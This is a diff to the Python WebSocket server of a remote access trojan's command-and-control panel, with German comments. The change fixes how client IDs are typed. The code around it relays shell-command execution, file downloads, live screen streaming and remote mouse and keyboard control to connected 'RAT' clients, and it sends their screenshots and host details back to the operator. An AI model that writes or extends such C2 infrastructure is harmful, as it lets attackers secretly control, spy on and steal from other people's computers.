@@ -77,34 +77,40 @@ async def websocket_endpoint(websocket: WebSocket):
                 break
 
             # --- Screenstream/Control Weiterleitung ---
-            # Für Fernsteuerung (VNC-Style) erwartet der Client:
-            # {
-            #   "action": "control",
-            #   "control_action": "move"|"click"|"mousedown"|"mouseup"|"scroll"|"keypress"|"keydown"|"keyup"|"type",
-            #   ...je nach Aktion weitere Felder wie x, y, button, key, text...
-            # }
-            # Nutze target_id (empfohlen) oder client_id (Fallback)
             if data.get('action') in ('screenstream_start', 'screenstream_stop', 'control'):
                 target = data.get('target_id') or data.get('client_id')
-                if target in RAT_CLIENTS:
+                try:
+                    target_int = int(target)
+                except Exception:
+                    await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Ungültige Client-ID: {target}"})
+                    continue
+                if target_int in RAT_CLIENTS:
                     payload = dict(data)
-                    payload["client_id"] = target  # explizit setzen
-                    await RAT_CLIENTS[target].send_json(payload)
-                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target} weitergeleitet."})
+                    payload["client_id"] = str(target_int)  # explizit als String für Frontend
+                    await RAT_CLIENTS[target_int].send_json(payload)
+                    await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Screenstream/Control an Client {target_int} weitergeleitet."})
                 else:
                     await send_to_web_ui({"type": "debug", "level": "warn", "msg": f"Client {target} nicht verbunden."})
                 continue
             # --- Standard-Kommandos ---
             action = data.get("action")
             target_id = data.get("target_id")
-            if not target_id or target_id not in RAT_CLIENTS:
+            try:
+                target_id_int = int(target_id)
+            except Exception:
                 await send_to_web_ui(
                     {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
                 )
                 await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
                 continue
-            target_ws = RAT_CLIENTS[target_id]
-            payload = {"action": action, "client_id": target_id}
+            if target_id_int not in RAT_CLIENTS:
+                await send_to_web_ui(
+                    {"type": "error", "message": "Client nicht gefunden oder nicht ausgewählt."}
+                )
+                await send_to_web_ui({"type": "debug", "level": "warn", "msg": "Client nicht gefunden für Befehl."})
+                continue
+            target_ws = RAT_CLIENTS[target_id_int]
+            payload = {"action": action, "client_id": str(target_id_int)}
             if action == "exec":
                 payload["command"] = data.get("command")
             elif action == "download":
@@ -129,12 +135,12 @@ async def websocket_endpoint(websocket: WebSocket):
                 pass
             try:
                 await target_ws.send_json(payload)
-                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id} gesendet."})
+                await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Befehl '{action}' an Client {target_id_int} gesendet."})
             except Exception as e:
                 await send_to_web_ui(
-                    {"type": "error", "message": f"Verbindung zu Client {target_id} verloren."}
+                    {"type": "error", "message": f"Verbindung zu Client {target_id_int} verloren."}
                 )
-                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Senden an Client {target_id}: {e}"})
+                await send_to_web_ui({"type": "debug", "level": "error", "msg": f"Fehler beim Senden an Client {target_id_int}: {e}"})
     except WebSocketDisconnect:
         logging.warning("Web-UI hat die Verbindung getrennt.")
         WEB_UI_SOCKET = None
@@ -147,7 +153,7 @@ async def send_client_list():
             "type": "client_list",
             "clients": [
                 {
-                    "id": cid,
+                    "id": str(cid),
                     "hostname": CLIENT_INFOS.get(cid, {}).get("hostname", f"Client {cid}"),
                     "address": getattr(ws, 'remote_address', 'unknown'),
                     "os": CLIENT_INFOS.get(cid, {}).get("os", ""),
@@ -198,7 +204,7 @@ async def rat_client_endpoint(websocket: WebSocket):
         {
             "type": "client_connected",
             "client": {
-                "id": client_id,
+                "id": str(client_id),
                 "hostname": hostname,
                 "address": remote_address,
                 "os": os_name,
@@ -224,7 +230,7 @@ async def rat_client_endpoint(websocket: WebSocket):
                     if screen_meta:
                         await send_to_web_ui({
                             "action": "screen_frame",
-                            "client_id": client_id,
+                            "client_id": str(client_id),
                             "img_bytes": base64.b64encode(data["bytes"]).decode("ascii"),
                             "width": screen_meta.get("width"),
                             "height": screen_meta.get("height"),
@@ -239,7 +245,7 @@ async def rat_client_endpoint(websocket: WebSocket):
                             screen_meta = meta
                             continue
                         # Standard-Kommandos
-                        meta["client_id"] = client_id
+                        meta["client_id"] = str(client_id)
                         await send_to_web_ui(meta)
                         await send_to_web_ui({"type": "debug", "level": "info", "msg": f"Nachricht von Client {client_id}: {meta.get('action')}"})
                     except Exception as e:
@@ -252,7 +258,7 @@ async def rat_client_endpoint(websocket: WebSocket):
             del RAT_CLIENTS[client_id]
         if client_id in CLIENT_INFOS:
             del CLIENT_INFOS[client_id]
-        await send_to_web_ui({"type": "client_disconnected", "client_id": client_id})
+        await send_to_web_ui({"type": "client_disconnected", "client_id": str(client_id)})
         await send_client_list()
 
 # --- Hilfsfunktionen zum Extrahieren von Infos ---
